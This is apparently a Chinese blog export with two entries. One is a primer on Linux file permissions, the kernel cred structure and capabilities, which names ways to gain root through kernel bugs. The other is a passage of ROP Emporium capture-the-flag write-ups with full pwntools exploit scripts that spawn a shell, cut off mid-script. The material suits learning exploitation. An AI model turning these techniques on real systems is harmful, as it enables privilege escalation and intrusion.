    <content><![CDATA[<blockquote><p>包括文件管理机制和进程权限管理机制</p></blockquote><a id="more"></a><h3><span id="prwx-wen-jian-quan-xian-kong-zhi">RWX 文件权限控制</span><a href="#prwx-wen-jian-quan-xian-kong-zhi" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031520.jpg" alt="image-20210223140839524"></p><table><thead><tr><th>权限</th><th>对文件的影响</th><th>对目录的影响</th></tr></thead><tbody><tr><td>r（读取）</td><td>可读取文件内容</td><td>可列出目录内容</td></tr><tr><td>w（写入）</td><td>可以修改文件内容</td><td>可在目录创建、删除文件</td></tr><tr><td>x（执行）</td><td>可以作为命令执行</td><td>可访问目录内容</td></tr></tbody></table><p>1位：文件类型</p><p>2-4位：User权限</p><p>5-7位：Group权限</p><p>8-10位：Other权限</p><h3><span id="pacl-wen-jian-quan-xian-kong-zhi">ACL文件权限控制</span><a href="#pacl-wen-jian-quan-xian-kong-zhi" class="header-anchor">#</a></h3><p>是在UGO+RWX权限控制的基础上实现的更灵活的权限管理机制</p><p>ACL设置流程</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031547.jpg" alt="img"></p><p>ACL权限检查</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031551.jpg" alt="img"></p><h3><span id="pjin-cheng-quan-xian-ping-zheng-cred">进程权限凭证cred</span><a href="#pjin-cheng-quan-xian-ping-zheng-cred" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> struct cred &#123;</span><br><span class="line">         atomic_t        usage;</span><br><span class="line"> #ifdef CONFIG_DEBUG_CREDENTIALS</span><br><span class="line">         atomic_t        subscribers;    &#x2F;* number of processes subscribed *&#x2F;</span><br><span class="line">         void            *put_addr;</span><br><span class="line">         unsigned        magic;</span><br><span class="line"> #define CRED_MAGIC      0x43736564</span><br><span class="line"> #define CRED_MAGIC_DEAD 0x44656144</span><br><span class="line"> #endif</span><br><span class="line">         uid_t           uid;            &#x2F;* real UID of the task *&#x2F;</span><br><span class="line">         gid_t           gid;            &#x2F;* real GID of the task *&#x2F;</span><br><span class="line">         uid_t           suid;           &#x2F;* saved UID of the task *&#x2F;</span><br><span class="line">         gid_t           sgid;           &#x2F;* saved GID of the task *&#x2F;</span><br><span class="line">         uid_t           euid;           &#x2F;* effective UID of the task *&#x2F;</span><br><span class="line">         gid_t           egid;           &#x2F;* effective GID of the task *&#x2F;</span><br><span class="line">         uid_t           fsuid;          &#x2F;* UID for VFS ops *&#x2F;</span><br><span class="line">         gid_t           fsgid;          &#x2F;* GID for VFS ops *&#x2F;</span><br><span class="line">         unsigned        securebits;     &#x2F;* SUID-less security management *&#x2F;</span><br><span class="line">         kernel_cap_t    cap_inheritable; &#x2F;* caps our children can inherit *&#x2F;</span><br><span class="line">         kernel_cap_t    cap_permitted;  &#x2F;* caps we&#39;re permitted *&#x2F;</span><br><span class="line">         kernel_cap_t    cap_effective;  &#x2F;* caps we can actually use *&#x2F;</span><br><span class="line">         kernel_cap_t    cap_bset;       &#x2F;* capability bounding set *&#x2F;</span><br><span class="line"> #ifdef CONFIG_KEYS</span><br><span class="line">         unsigned char   jit_keyring;    &#x2F;* default keyring to attach requested</span><br><span class="line">                                          * keys to *&#x2F;</span><br><span class="line">         struct key      *thread_keyring; &#x2F;* keyring private to this thread *&#x2F;</span><br><span class="line">         struct key      *request_key_auth; &#x2F;* assumed request_key authority *&#x2F;</span><br><span class="line">         struct thread_group_cred *tgcred; &#x2F;* thread-group shared credentials *&#x2F;</span><br><span class="line"> #endif</span><br><span class="line"> #ifdef CONFIG_SECURITY</span><br><span class="line">         void            *security;      &#x2F;* subjective LSM security *&#x2F;</span><br><span class="line"> #endif</span><br><span class="line">        struct user_struct *user;       &#x2F;* real user ID subscription *&#x2F;</span><br><span class="line">        struct user_namespace *user_ns; &#x2F;* cached user-&gt;user_ns *&#x2F;</span><br><span class="line">        struct group_info *group_info;  &#x2F;* supplementary groups for euid&#x2F;fsgid *&#x2F;</span><br><span class="line">        struct rcu_head rcu;            &#x2F;* RCU deletion hook *&#x2F;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">超级用户 root（0）</span><br><span class="line">程序用户（1~499）</span><br><span class="line">普通用户（500~65535）</span><br></pre></td></tr></table></figure><p>cred结构主要为了控制进程权限而存在，这里需要区分一些id：</p><ul><li>uid 是创建进程的用户的id</li><li>euid 是进程运行过程中实时的id（比如有的时候需要暂时切换进入内核态执行，然后再退回用户态）</li><li>suid 是保存的euid切换之前的id</li></ul><p>内核中主要有三个用户：uid（实际用户）、euid（有效用户）、suid（保存用户），可通过setuid、seteuid、setreuid系统调用实现用户切换。<br>setuid规则：<br>1.当有超级用户权限，修改uid,euid,suid为新用户<br>2.当没有超级用户权限，新用户id参数等于uid或suid时，修改euid为新用户</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031618.jpg" alt="技术分享"></p><p>两种修改进程cred方式：</p><ul><li><p>内核态任意代码执行：使用<code>commit_creds(prepare_kernel_cred(0))</code>，分配新凭证(uid=0,gid=0)给所在进程，从而获取root权限</p></li><li><p>内核态任意地址读写漏洞：爆破内存定位到当前进程的cred位置，将cred结构体的uid~fsgid全部覆写为0(前28字节)</p></li></ul><h3><span id="pcapability-neng-li">capability 能力</span><a href="#pcapability-neng-li" class="header-anchor">#</a></h3><p>为了细分root的权限，将root权限分为37种能力，当非root程序进行操作时，会检查进程的能力，判断是否有权限执行某些操作。</p><p><code>man capabilities</code></p><table><thead><tr><th style="text-align:left">capability 名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">CAP_AUDIT_CONTROL</td><td style="text-align:left">启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td></tr><tr><td style="text-align:left">CAP_AUDIT_READ</td><td style="text-align:left">允许通过 multicast netlink 套接字读取审计日志</td></tr><tr><td style="text-align:left">CAP_AUDIT_WRITE</td><td style="text-align:left">将记录写入内核审计日志</td></tr><tr><td style="text-align:left">CAP_BLOCK_SUSPEND</td><td style="text-align:left">使用可以阻止系统挂起的特性</td></tr><tr><td style="text-align:left">CAP_CHOWN</td><td style="text-align:left">修改文件所有者的权限</td></tr><tr><td style="text-align:left">CAP_DAC_OVERRIDE</td><td style="text-align:left">忽略文件的 DAC 访问限制</td></tr><tr><td style="text-align:left">CAP_DAC_READ_SEARCH</td><td style="text-align:left">忽略文件读及目录搜索的 DAC 访问限制</td></tr><tr><td style="text-align:left">CAP_FOWNER</td><td style="text-align:left">忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td></tr><tr><td style="text-align:left">CAP_FSETID</td><td style="text-align:left">允许设置文件的 setuid 位</td></tr><tr><td style="text-align:left">CAP_IPC_LOCK</td><td style="text-align:left">允许锁定共享内存片段</td></tr><tr><td style="text-align:left">CAP_IPC_OWNER</td><td style="text-align:left">忽略 IPC 所有权检查</td></tr><tr><td style="text-align:left">CAP_KILL</td><td style="text-align:left">允许对不属于自己的进程发送信号</td></tr><tr><td style="text-align:left">CAP_LEASE</td><td style="text-align:left">允许修改文件锁的 FL_LEASE 标志</td></tr><tr><td style="text-align:left">CAP_LINUX_IMMUTABLE</td><td style="text-align:left">允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td></tr><tr><td style="text-align:left">CAP_MAC_ADMIN</td><td style="text-align:left">允许 MAC 配置或状态更改</td></tr><tr><td style="text-align:left">CAP_MAC_OVERRIDE</td><td style="text-align:left">覆盖 MAC(Mandatory Access Control)</td></tr><tr><td style="text-align:left">CAP_MKNOD</td><td style="text-align:left">允许使用 mknod() 系统调用</td></tr><tr><td style="text-align:left">CAP_NET_ADMIN</td><td style="text-align:left">允许执行网络管理任务</td></tr><tr><td style="text-align:left">CAP_NET_BIND_SERVICE</td><td style="text-align:left">允许绑定到小于 1024 的端口</td></tr><tr><td style="text-align:left">CAP_NET_BROADCAST</td><td style="text-align:left">允许网络广播和多播访问</td></tr><tr><td style="text-align:left">CAP_NET_RAW</td><td style="text-align:left">允许使用原始套接字</td></tr><tr><td style="text-align:left">CAP_SETGID</td><td style="text-align:left">允许改变进程的 GID</td></tr><tr><td style="text-align:left">CAP_SETFCAP</td><td style="text-align:left">允许为文件设置任意的 capabilities</td></tr><tr><td style="text-align:left">CAP_SETPCAP</td><td style="text-align:left">参考 capabilities man page</td></tr><tr><td style="text-align:left">CAP_SETUID</td><td style="text-align:left">允许改变进程的 UID</td></tr><tr><td style="text-align:left">CAP_SYS_ADMIN</td><td style="text-align:left">允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td></tr><tr><td style="text-align:left">CAP_SYS_BOOT</td><td style="text-align:left">允许重新启动系统</td></tr><tr><td style="text-align:left">CAP_SYS_CHROOT</td><td style="text-align:left">允许使用 chroot() 系统调用</td></tr><tr><td style="text-align:left">CAP_SYS_MODULE</td><td style="text-align:left">允许插入和删除内核模块</td></tr><tr><td style="text-align:left">CAP_SYS_NICE</td><td style="text-align:left">允许提升优先级及设置其他进程的优先级</td></tr><tr><td style="text-align:left">CAP_SYS_PACCT</td><td style="text-align:left">允许执行进程的 BSD 式审计</td></tr><tr><td style="text-align:left">CAP_SYS_PTRACE</td><td style="text-align:left">允许跟踪任何进程</td></tr><tr><td style="text-align:left">CAP_SYS_RAWIO</td><td style="text-align:left">允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td></tr><tr><td style="text-align:left">CAP_SYS_RESOURCE</td><td style="text-align:left">忽略资源限制</td></tr><tr><td style="text-align:left">CAP_SYS_TIME</td><td style="text-align:left">允许改变系统时钟</td></tr><tr><td style="text-align:left">CAP_SYS_TTY_CONFIG</td><td style="text-align:left">允许配置 TTY 设备</td></tr><tr><td style="text-align:left">CAP_SYSLOG</td><td style="text-align:left">允许使用 syslog() 系统调用</td></tr><tr><td style="text-align:left">CAP_WAKE_ALARM</td><td style="text-align:left">允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td></tr></tbody></table><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-03-03-031625.jpg" alt="linux capabilities"></p><p>参考：</p><ul><li><p><a href="https://baijiahao.baidu.com/s?id=1648635487484008654&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1648635487484008654&amp;wfr=spider&amp;for=pc</a></p></li><li><p><a href="https://www.codenong.com/cs106888174/">https://www.codenong.com/cs106888174/</a></p></li><li><p><a href="https://www.anquanke.com/post/id/98628">https://www.anquanke.com/post/id/98628</a></p></li><li><p><a href="https://gohalo.me/post/linux-capabilities-introduce.html">https://gohalo.me/post/linux-capabilities-introduce.html</a></p></li><li><p><a href="http://rk700.github.io/2016/10/26/linux-capabilities/">http://rk700.github.io/2016/10/26/linux-capabilities/</a></p></li><li><p><a href="https://cloud.tencent.com/developer/article/1529342">https://cloud.tencent.com/developer/article/1529342</a></p></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>linux_kernel</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>linux kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP Emporium (中)</title>
    <url>/77e17aac.html</url>
    <content><![CDATA[<blockquote><p>ROP Emporium 第二部分</p></blockquote><a id="more"></a><h3><span id="pbadchars">badchars</span><a href="#pbadchars" class="header-anchor">#</a></h3><p>不可以输入一些可见字符，但是存在异或相关的gadget</p><p>因此我们可以先和将<code>/bin/sh\x00</code>与某个数异或后写入缓冲区，然后再通过gadget将其异或回来，最后达成利用</p><h4><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"> 8048890:       30 0b                   xor    %cl,(%ebx)</span></span><br><span class="line"><span class="string"> 8048892:       c3                      ret</span></span><br><span class="line"><span class="string"> 8048893:       89 37                   mov    %esi,(%edi)</span></span><br><span class="line"><span class="string"> 8048895:       c3                      ret</span></span><br><span class="line"><span class="string"> 8048896:       5b                      pop    %ebx</span></span><br><span class="line"><span class="string"> 8048897:       59                      pop    %ecx</span></span><br><span class="line"><span class="string"> 8048898:       c3                      ret</span></span><br><span class="line"><span class="string"> 8048899:       5e                      pop    %esi</span></span><br><span class="line"><span class="string"> 804889a:       5f                      pop    %edi</span></span><br><span class="line"><span class="string"> 804889b:       c3                      ret</span></span><br><span class="line"><span class="string"> 804889c:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string"> 804889e:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">xor_byte = <span class="number">0x31</span></span><br><span class="line">xor_binsh = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    xor_binsh += chr(ord(s[i])^xor_byte)</span><br><span class="line">xor_binsh = xor_binsh.encode()</span><br><span class="line">data_addr = <span class="number">0x804a038</span></span><br><span class="line">xor_ptr_ebx_cl_ret = <span class="number">0x8048890</span></span><br><span class="line">mov_ptr_edi_esi_ret = <span class="number">0x8048893</span></span><br><span class="line">pop_ebx_ecx_ret = <span class="number">0x8048896</span></span><br><span class="line">pop_esi_edi_ret = <span class="number">0x8048899</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars32'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./badchars32'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">44</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mov xor_binsh into data</span></span><br><span class="line">payload += p32(pop_esi_edi_ret)+xor_binsh[<span class="number">0</span>:<span class="number">4</span>]+p32(data_addr)+p32(mov_ptr_edi_esi_ret)</span><br><span class="line">payload += p32(pop_esi_edi_ret)+xor_binsh[<span class="number">4</span>:]+p32(data_addr+<span class="number">4</span>)+p32(mov_ptr_edi_esi_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor xor_binsh with 0x30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    payload += p32(pop_ebx_ecx_ret)+p32(data_addr+i)+p32(xor_byte)+p32(xor_ptr_ebx_cl_ret)</span><br><span class="line"></span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0xdeafbeaf</span>)+p32(data_addr)</span><br><span class="line">p.recvuntil(<span class="string">'\n&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0000000000400b30 &lt;usefulGadgets&gt;:</span></span><br><span class="line"><span class="string">  400b30:       45 30 37                xor    %r14b,(%r15)</span></span><br><span class="line"><span class="string">  400b33:       c3                      retq</span></span><br><span class="line"><span class="string">  400b34:       4d 89 65 00             mov    %r12,0x0(%r13)</span></span><br><span class="line"><span class="string">  400b38:       c3                      retq</span></span><br><span class="line"><span class="string">  400b39:       5f                      pop    %rdi</span></span><br><span class="line"><span class="string">  400b3a:       c3                      retq</span></span><br><span class="line"><span class="string">  400b3b:       41 5c                   pop    %r12</span></span><br><span class="line"><span class="string">  400b3d:       41 5d                   pop    %r13</span></span><br><span class="line"><span class="string">  400b3f:       c3                      retq</span></span><br><span class="line"><span class="string">  400b40:       41 5e                   pop    %r14</span></span><br><span class="line"><span class="string">  400b42:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  400b44:       c3                      retq</span></span><br><span class="line"><span class="string">  400b45:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span></span><br><span class="line"><span class="string">  400b4c:       00 00 00</span></span><br><span class="line"><span class="string">  400b4f:       90                      nop</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./badchars'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">data_addr = <span class="number">0x601070</span></span><br><span class="line"></span><br><span class="line">xor_ptr_r15_r14_ret = <span class="number">0x400b30</span></span><br><span class="line">mov_ptr_r13_r12_ret = <span class="number">0x400b34</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400b39</span></span><br><span class="line">pop_r12_r13_ret = <span class="number">0x400b3b</span></span><br><span class="line">pop_r14_r15_ret = <span class="number">0x400b40</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="string">'/bin/sh\x00'</span></span><br><span class="line">xor_byte = <span class="number">0x44</span></span><br><span class="line"></span><br><span class="line">xor_binsh = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    xor_binsh+=chr(ord(binsh[i])^xor_byte)</span><br><span class="line">xor_binsh = xor_binsh.encode()</span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">40</span></span><br><span class="line"><span class="comment"># mov xor_binsh into data</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_r12_r13_ret)+xor_binsh+p64(data_addr)+p64(mov_ptr_r13_r12_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">    payload += p64(pop_r14_r15_ret)+p64(xor_byte)+p64(data_addr+i)+p64(xor_ptr_r15_r14_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call system</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(data_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="pfluff">fluff</span><a href="#pfluff" class="header-anchor">#</a></h3><p>无法一次性写入<code>/bin/sh\x00</code>，所以我们利用gadget可以分次写入</p><h4><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">08048670 &lt;questionableGadgets&gt;:</span></span><br><span class="line"><span class="string"> 8048670:       5f                      pop    %edi</span></span><br><span class="line"><span class="string"> 8048671:       31 d2                   xor    %edx,%edx</span></span><br><span class="line"><span class="string"> 8048673:       5e                      pop    %esi</span></span><br><span class="line"><span class="string"> 8048674:       bd be ba fe ca          mov    $0xcafebabe,%ebp</span></span><br><span class="line"><span class="string"> 8048679:       c3                      ret</span></span><br><span class="line"><span class="string"> 804867a:       5e                      pop    %esi</span></span><br><span class="line"><span class="string"> 804867b:       31 da                   xor    %ebx,%edx</span></span><br><span class="line"><span class="string"> 804867d:       5d                      pop    %ebp</span></span><br><span class="line"><span class="string"> 804867e:       bf be ba ad de          mov    $0xdeadbabe,%edi</span></span><br><span class="line"><span class="string"> 8048683:       c3                      ret</span></span><br><span class="line"><span class="string"> 8048684:       bf ef be ad de          mov    $0xdeadbeef,%edi</span></span><br><span class="line"><span class="string"> 8048689:       87 ca                   xchg   %ecx,%edx</span></span><br><span class="line"><span class="string"> 804868b:       5d                      pop    %ebp</span></span><br><span class="line"><span class="string"> 804868c:       ba d0 ce fa de          mov    $0xdefaced0,%edx</span></span><br><span class="line"><span class="string"> 8048691:       c3                      ret</span></span><br><span class="line"><span class="string"> 8048692:       5f                      pop    %edi</span></span><br><span class="line"><span class="string"> 8048693:       89 11                   mov    %edx,(%ecx)</span></span><br><span class="line"><span class="string"> 8048695:       5d                      pop    %ebp</span></span><br><span class="line"><span class="string"> 8048696:       5b                      pop    %ebx</span></span><br><span class="line"><span class="string"> 8048697:       30 19                   xor    %bl,(%ecx)</span></span><br><span class="line"><span class="string"> 8048699:       c3                      ret</span></span><br><span class="line"><span class="string"> 804869a:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string"> 804869c:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string"> 804869e:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./fluff32'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fluff32'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">data_addr = <span class="number">0x804a028</span></span><br><span class="line">mov_ptr_ecx_edx= <span class="number">0x8048693</span></span><br><span class="line">pop_ebx = <span class="number">0x80483e1</span></span><br><span class="line"><span class="comment">#pop_ebx = 0x8048696</span></span><br><span class="line">xor_edx_edx = <span class="number">0x8048671</span></span><br><span class="line">xor_edx_ebx = <span class="number">0x804867b</span></span><br><span class="line">xchg_edx_ecx = <span class="number">0x8048689</span></span><br><span class="line">binsh = <span class="string">b'/bin/sh\x00'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_write</span><span class="params">(data,addr)</span>:</span></span><br><span class="line">    payload = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ecx = addr</span></span><br><span class="line">    payload += p32(xor_edx_edx)+p32(deadbeaf)</span><br><span class="line">    payload += p32(pop_ebx)</span><br><span class="line">    payload += p32(addr)</span><br><span class="line">    payload += p32(xor_edx_ebx)+p32(deadbeaf)</span><br><span class="line">    payload += p32(xchg_edx_ecx)+p32(deadbeaf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edx = data</span></span><br><span class="line">    payload += p32(xor_edx_edx)+p32(deadbeaf)</span><br><span class="line">    payload += p32(pop_ebx)</span><br><span class="line">    payload += data</span><br><span class="line">    payload += p32(xor_edx_ebx)+p32(deadbeaf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ptr[ecx]=data</span></span><br><span class="line">    payload += p32(mov_ptr_ecx_edx)+p32(deadbeaf)+p32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">deadbeaf = <span class="number">0xdeafbeaf</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">44</span></span><br><span class="line">payload += payload_write(binsh[<span class="number">0</span>:<span class="number">4</span>],data_addr)</span><br><span class="line">payload += payload_write(binsh[<span class="number">4</span>:],data_addr+<span class="number">4</span>)</span><br><span class="line">payload += p32(system_addr)+p32(deadbeaf)+p32(data_addr)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4><span id="px64">x64</span><a href="#px64" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0000000000400820 &lt;questionableGadgets&gt;:</span></span><br><span class="line"><span class="string">  400820:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  400822:       4d 31 db                xor    %r11,%r11</span></span><br><span class="line"><span class="string">  400825:       41 5e                   pop    %r14</span></span><br><span class="line"><span class="string">  400827:       bf 50 10 60 00          mov    $0x601050,%edi</span></span><br><span class="line"><span class="string">  40082c:       c3                      retq</span></span><br><span class="line"><span class="string">  40082d:       41 5e                   pop    %r14</span></span><br><span class="line"><span class="string">  40082f:       4d 31 e3                xor    %r12,%r11</span></span><br><span class="line"><span class="string">  400832:       41 5c                   pop    %r12</span></span><br><span class="line"><span class="string">  400834:       41 bd 60 40 60 00       mov    $0x604060,%r13d</span></span><br><span class="line"><span class="string">  40083a:       c3                      retq</span></span><br><span class="line"><span class="string">  40083b:       bf 50 10 60 00          mov    $0x601050,%edi</span></span><br><span class="line"><span class="string">  400840:       4d 87 d3                xchg   %r10,%r11</span></span><br><span class="line"><span class="string">  400843:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  400845:       41 bb 50 20 60 00       mov    $0x602050,%r11d</span></span><br><span class="line"><span class="string">  40084b:       c3                      retq</span></span><br><span class="line"><span class="string">  40084c:       41 5f                   pop    %r15</span></span><br><span class="line"><span class="string">  40084e:       4d 89 1a                mov    %r11,(%r10)</span></span><br><span class="line"><span class="string">  400851:       41 5d                   pop    %r13</span></span><br><span class="line"><span class="string">  400853:       41 5c                   pop    %r12</span></span><br><span class="line"><span class="string">  400855:       45 30 22                xor    %r12b,(%r10)</span></span><br><span class="line"><span class="string">  400858:       c3                      retq</span></span><br><span class="line"><span class="string">  400859:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./fluff'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fluff'</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</span><br><span class="line">data_addr = <span class="number">0x601050</span></span><br><span class="line"></span><br><span class="line">xor_r11_r11 = <span class="number">0x400822</span></span><br><span class="line">xor_r11_r12 = <span class="number">0x40082f</span></span><br><span class="line">xchg_r11_r10 = <span class="number">0x400840</span></span><br><span class="line">mov_ptr_r10_r11 = <span class="number">0x40084e</span></span><br><span class="line">pop_r12 = <span class="number">0x400832</span></span><br><span class="line"></span><br><span class="line">deadbeaf = <span class="number">0xdeadbeaf</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">40</span></span><br><span class="line">binsh = <span class="string">b'/bin/sh\x00'</span></span><br><span class="line"><span class="comment"># r10 = addr</span></span><br><span class="line">payload += p64(xor_r11_r11)+p64(deadbeaf)</span><br><span class="line">payload += p64(pop_r12)</span><br><span class="line">payload += p64(data_addr)</span><br><span class="line">payload += p64(xor_r11_r12)+p64(deadbeaf)</span><br><span class="line">payload += p64(xchg_r11_r10)+p64(deadbeaf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r11 = data</span></span><br><span class="line">payload += p64(xor_r11_r11)+p64(deadbeaf)</span><br><span class="line">payload += p64(pop_r12)</span><br><span class="line">payload += binsh</span><br><span class="line">payload += p64(xor_r11_r12)+p64(deadbeaf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [r10]  =r11</span></span><br><span class="line">payload += p64(mov_ptr_r10_r11)+p64(deadbeaf)+p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x4008c3</span>)+p64(data_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="ppivot">pivot</span><a href="#ppivot" class="header-anchor">#</a></h3><p>栈溢出长度太短，因此选择通过<code>stack pivoting</code>达成利用</p><h4><span id="px86">x86</span><a href="#px86" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">080488c0 &lt;usefulGadgets&gt;:</span></span><br><span class="line"><span class="string"> 80488c0:       58                      pop    %eax</span></span><br><span class="line"><span class="string"> 80488c1:       c3                      ret</span></span><br><span class="line"><span class="string"> 80488c2:       94                      xchg   %eax,%esp</span></span><br><span class="line"><span class="string"> 80488c3:       c3                      ret</span></span><br><span class="line"><span class="string"> 80488c4:       8b 00                   mov    (%eax),%eax</span></span><br><span class="line"><span class="string"> 80488c6:       c3                      ret</span></span><br><span class="line"><span class="string"> 80488c7:       01 d8                   add    %ebx,%eax</span></span><br><span class="line"><span class="string"> 80488c9:       c3                      ret</span></span><br><span class="line"><span class="string"> 80488ca:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string"> 80488cc:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string"> 80488ce:       66 90                   xchg   %ax,%ax</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p = process(<span class="string">'./pivot32'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pivot32'</span>)</span><br><span class="line">libp = ELF(<span class="string">'./libpivot32.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_plt = elf.plt[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_got = elf.got[<span class="string">'foothold_function'</span>]</span><br><span class="line">foothold_function_addr = libp.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win_addr = libp.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line">offset = ret2win_addr - foothold_function_addr</span><br><span class="line"></span><br><span class="line">pop_eax= <span class="number">0x80488c0</span></span><br><span class="line">xchg_esp_eax = <span class="number">0x80488c2</span></span><br><span class="line">mov_ptr_eax_eax = <span class="number">0x80488c4</span></span><br><span class="line">add_eax_ebx = <span class="number">0x80488c7</span></span><br><span class="line">call_eax = <span class="number">0x80486a3</span></span><br><span 